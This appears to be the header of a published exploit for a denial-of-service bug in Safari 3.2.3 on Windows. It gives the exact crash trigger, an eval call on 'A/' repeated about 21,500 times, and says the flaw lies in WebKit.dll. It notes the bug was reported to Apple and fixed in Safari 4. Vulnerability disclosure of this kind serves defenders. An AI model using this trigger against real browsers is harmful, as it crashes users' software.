# Safari 3.2.3 (Win32) JavaScript 'eval' Remote Denial of Service Exploit

#
# *********************************************************************************************************
# Safari crashes when interpreting a webpage that calls the "eval" JavaScript function with "A/" repeating
# 21526 times (43052 bytes). When triggering this vulnerability, Safari will throw a "Stack Overflow"
# exception, and then an access violation when adjusting the trigger to "A/" repeating 21697 times
# (43394 bytes). The problem originates in the module "WebKit.dll". Safari uses this module as part of the
# WebKit layout engine (www.webkit.org).

# This issue was reported to Apple several months ago and it looks like they fixed it in Safari 4
# (4.1.2 tested) after recent testing. It has also been lying around the Fun Archive @ krakowlabs.com for
# quite a while too. Btw, STACK_OVERFLOW does NOT mean there is a buffer overflow on the stack. It pretty
# much means that the stack for the process has been exhausted and its maximum size has been reached.
